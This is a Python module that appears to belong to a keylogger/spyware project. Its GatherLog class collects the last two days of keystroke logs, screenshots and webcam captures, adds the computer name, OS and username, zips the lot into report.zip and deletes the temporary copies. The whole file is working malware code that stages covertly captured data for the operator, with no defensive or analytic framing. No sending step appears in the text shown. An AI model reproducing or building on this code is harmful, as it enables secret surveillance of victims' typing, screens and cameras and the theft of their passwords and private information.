import os
import shutil
import zipfile
import platform
from datetime import datetime, timedelta

log_path = 'log'
screenshot_path = 'screenshot'
camera_path = 'camera'
tmp_path = 'keylogger report'
n_days_ago = 2

class GatherLog(object):
    def __init__(self, log_path, screenshot_path, camera_path, tmp_path, n_days_ago, zip_file='report.zip'):
        #tmp_path = os.path.join(os.environ['TMP'], tmp_path)
        #zip_file = os.path.join(os.environ['TMP'], zip_file)
        start = int((datetime.now() - timedelta(days=n_days_ago)).strftime("%Y%m%d"))
        end = int(datetime.now().strftime("%Y%m%d"))+1
        date_range = list(map(str, list(range(start, end))))

        if not os.path.isdir(os.path.join(tmp_path, log_path)):
            os.makedirs(os.path.join(tmp_path, log_path))

        if os.path.isdir(log_path):
            for file in os.listdir(log_path):
                if os.path.isfile(os.path.join(log_path, file)) and os.path.splitext(file)[0] in date_range:
                    #print(file)
                    shutil.copy(os.path.join(log_path, file), os.path.join(tmp_path, log_path, file))
        if os.path.isdir(screenshot_path):
            for folder in os.listdir(screenshot_path):
                if os.path.isdir(os.path.join(screenshot_path, folder)) and folder in date_range:
                    #print(folder)
                    shutil.copytree(os.path.join(screenshot_path, folder), os.path.join(tmp_path, screenshot_path, folder), dirs_exist_ok=True)
        if os.path.isdir(camera_path):
            for folder in os.listdir(camera_path):
                if os.path.isdir(os.path.join(camera_path, folder)) and folder in date_range:
                    #print(folder)
                    shutil.copytree(os.path.join(camera_path, folder), os.path.join(tmp_path, camera_path, folder), dirs_exist_ok=True)
        sys_info = platform.uname()
        with open(os.path.join(tmp_path, 'sys_info.txt'), 'w+') as f:
            f.write('OS: ' + sys_info.system + ' ' + sys_info.version + ' ' + sys_info.machine + \
                    '\nComputer Name: ' + sys_info.node + '\nUser: ' + os.environ['USERNAME'])

            
        with zipfile.ZipFile(zip_file, 'w') as z:
            for folder in [x[0] for x in os.walk(tmp_path)]:
                for file in os.listdir(folder):
                    #print(file)
                    if os.path.isfile(os.path.join(folder, file)):
                        z.write(os.path.join(folder, file))
        shutil.rmtree(tmp_path)
        








